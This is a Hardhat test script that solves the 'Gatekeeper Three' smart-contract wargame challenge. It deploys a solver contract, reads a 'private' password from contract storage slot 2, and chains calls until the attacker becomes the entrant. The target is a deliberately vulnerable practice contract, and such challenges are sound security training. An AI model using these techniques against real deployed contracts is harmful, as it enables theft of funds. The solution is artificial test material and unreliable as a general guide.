const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Gatekeeper Three', function () {

    let deployer, attacker;
    
    before(async () =>{
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        const network = await ethers.provider.getNetwork();
        const chainID = network.chainId
        
        if (chainID == 5){ // goerli testnet
            /** connect to Dapp in goerli **/
            [attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('GatekeeperThree');
            this.target = ContractFactory.attach("0x17FC89DCdAB066f37E793F6FC403ede3F195350C");
            
        } else { // local network - hardhat  
            /** local test **/
            [deployer, attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('GatekeeperThree', deployer);
            this.target = await ContractFactory.deploy();
        }
    });

    it('Exploit', async () => {
        /** CODE YOUR EXPLOIT HERE */
        console.log(`\t Deploying GatekeeperThreeSolver...`);
        const GatekeeperThreeSolverFactory = await ethers.getContractFactory('GatekeeperThreeSolver', attacker);
        const GTS = await GatekeeperThreeSolverFactory.deploy(this.target.address);

        console.log(`\t Executing prepare1()...`);
        let pre1TX = await GTS.connect(attacker).prepare1(
            {gasLimit:500000} // 500k gasLimit is for solving "Error: Transaction reverted: trying to deploy a contract whose code is too large"  
        ); await pre1TX.wait();
        let trick = await this.target.trick();
        let password = parseInt(await ethers.provider.getStorageAt(trick, 2));
        console.log(`\t SimpleTrick: ${trick}`);
        console.log(`\t password: ${password}`);

        console.log(`\t Executing prepare1()...`);
        let pre2TX = await GTS.connect(attacker).prepare2(password, {gasLimit:200000}); await pre2TX.wait();
        console.log(`\t allow_enterance: ${await this.target.allow_enterance()}`);

        console.log(`\t Executing exploit()...`);
        let value = parseInt(ethers.utils.parseEther("0.001", "ether")) + 1;
        let exploitTX = await GTS.connect(attacker).exploit({value: value}); await exploitTX.wait();
        console.log(`\t entrant : ${await this.target.entrant()}`);
        console.log(`\t attacker: ${attacker.address}`);

    }).timeout(0);

    after(async () => {
        /** SUCCESS CONDITIONS */
        expect(await this.target.entrant()).to.be.eq(attacker.address);
    });
});